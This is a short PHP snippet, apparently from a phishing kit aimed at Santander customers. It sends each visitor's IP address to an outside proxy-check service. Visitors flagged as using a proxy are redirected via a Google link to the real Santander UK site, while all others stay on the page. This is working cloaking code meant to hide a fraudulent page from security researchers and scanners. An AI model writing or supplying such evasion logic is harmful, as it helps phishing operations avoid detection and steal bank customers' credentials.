<?php

# Visitor proxy check snippet

$v_ip = $_SERVER['REMOTE_ADDR'];
$arContext['http']['timeout'] = 10;
$context = stream_context_create($arContext);

$response = file_get_contents('http://www.shroomery.org/ythan/proxycheck.php?ip='.$v_ip, 0, $context);

if ($response == 'Y') {

        header("Location: https://www.google.ie/url?sa=t&rct=j&q=&esrc=s&source=web&cd=2&cad=rja&uact=8&ved=0ahUKEwj0wrr7z6fLAhUDSRoKHcOfAsgQFggiMAE&url=http%3A%2F%2Fwww.santander.co.uk%2F&usg=AFQjCNGxsB2ppSgA2_EdiE9XLymB9HZLkQ");
		die();
}

?>